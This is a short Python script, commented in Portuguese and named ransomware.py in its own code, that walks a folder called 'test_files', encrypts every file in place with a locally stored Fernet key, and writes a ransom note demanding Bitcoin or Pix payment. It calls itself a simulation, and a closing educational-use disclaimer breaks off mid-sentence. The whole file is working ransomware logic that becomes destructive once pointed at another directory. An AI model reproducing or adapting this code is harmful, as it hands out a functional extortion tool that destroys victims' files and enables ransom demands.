from cryptography.fernet import Fernet
import os

# Gerar chave de criptografia
def gerar_chave():
    chave = Fernet.generate_key()
    with open("chave.key", "wb") as chave_file:
        chave_file.write(chave)

# Carregar chave de criptografia salva
def carregar_chave():
    return open("chave.key", "rb").read()

# Função para criptografar um único arquivo
def criptografar_arquivo(nome_arquivo, chave):
    f = Fernet(chave)
    with open(nome_arquivo, "rb") as file:
        dados = file.read()
    dados_encriptados = f.encrypt(dados)
    with open(nome_arquivo, "wb") as file:
        file.write(dados_encriptados)

# Encontrar os arquivos para criptografar
def encontrar_arquivos(diretorio):
    lista = []
    for raiz, dirs, arquivos in os.walk(diretorio):
        for nome_arquivo in arquivos:
            caminho = os.path.join(raiz, nome_arquivo)

            # Ignorar chave e o próprio script
            if nome_arquivo == "ransomware.py":
                continue
            if nome_arquivo.endswith(".key"):
                continue

            lista.append(caminho)

    return lista

# Mensagem de aviso
def criar_mensagem_resgate():
    with open("LEIA_ISSO.txt", "w") as f:
        f.write("Seus arquivos foram criptografados!\n")
        f.write("Para recuperar seus arquivos, entre em contato para realizar o pagamento Bitcoin ou realize transferência Pix.\n")
        f.write("Depois disso.enviaremos a chave para que consiga recuperar os arquivos.\n")

# Fluxo principal
def main():
    # Gerar chave caso não exista
    if not os.path.exists("chave.key"):
        gerar_chave()

    chave = carregar_chave()

    arquivos_para_criptografar = encontrar_arquivos("test_files")

    for arquivo in arquivos_para_criptografar:
        criptografar_arquivo(arquivo, chave)

    criar_mensagem_resgate()
    print("Simulação executada — arquivos criptografados na pasta test_files")

if __name__ == "__main__":
    main()
# Aviso: Este código é para fins educacionais apenas. Nunca utilize ransomware ou qualquer outro software malicioso em sistemas sem permissão e

